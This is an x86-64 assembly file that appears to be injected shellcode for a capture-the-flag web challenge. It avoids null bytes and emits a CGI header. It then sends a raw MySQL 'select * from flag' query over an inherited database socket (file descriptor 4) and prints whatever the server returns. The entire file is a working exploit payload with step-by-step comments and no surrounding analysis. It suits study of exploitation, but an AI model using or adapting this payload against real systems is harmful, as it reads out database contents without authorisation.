.text
.globl main
main:
	push %rbp
	mov %rsp, %rbp

	// syscall 1 (sys_write)
	xor %rax, %rax
	mov $1, %al

	// fd 1 (stdout)
	xor %rdi, %rdi
	mov %rax, %rdi

	// &string into %rsi
	xor %rdx, %rdx
	push %rdx
	// "Content-type:    text/html\n\n\n\n\n\n" is what we need to output first
	mov $0x0a0a0a0a0a0a6c6d, %rcx
	push %rcx
	mov $0x74682f7478657420, %rcx
	push %rcx
	mov $0x2020203a65707974, %rcx
	push %rcx
	mov $0x2d746e65746e6f43, %rcx
	push %rcx
	
	mov %rsp, %rsi

	// count
	mov $32, %dl
	syscall
	

	// &string into %rsi	
	// Query we want to send to mysql server:
	// "\x03select    *   from flag"
	xor %rax, %rax
	push %rax
	mov $0x67616c66206d6f72, %rcx
	push %rcx
	mov $0x662020202a202020, %rcx
	push %rcx
	mov $0x207463656c657303, %rcx
	push %rcx
	xor %rcx, %rcx
	mov $24, %cl
	mov %ecx, -0x4(%rsp)
	lea -0x4(%rsp), %rsi

	// syscall 1 (write)
	mov $1, %al

	// fd 4 (mysql)
	xor %rdi, %rdi
	inc %rdi
	inc %rdi
	inc %rdi
	inc %rdi

	xor %rdx, %rdx
	mov $28, %dl	
	syscall

	// read from the mysql server

	xor %rax, %rax
	mov $0xff, %al
	
	// create some space on the stack
	sub %rax, %rsp

	// syscall 0 (read)
	xor %rax, %rax

	// fd 4 (mysql)
	xor %rdi, %rdi
	inc %rdi
	inc %rdi
	inc %rdi
	inc %rdi

	
	// %buf (sp)
	mov %rsp, %rsi

	// size
	xor %rdx, %rdx
	mov $0xff, %dl
	syscall

	// write out what the mysql server sent us!

	// num bytes returned from the read is what we want to write
	mov %rax, %rdx

	// syscall 1 (write)
	xor %rax, %rax
	mov $1, %al

	// fd 1 (stdout)
	xor %rdi, %rdi
	mov %rax, %rdi
	
	// %buf (sp)
	mov %rsp, %rsi

	syscall

	leave
	ret
	
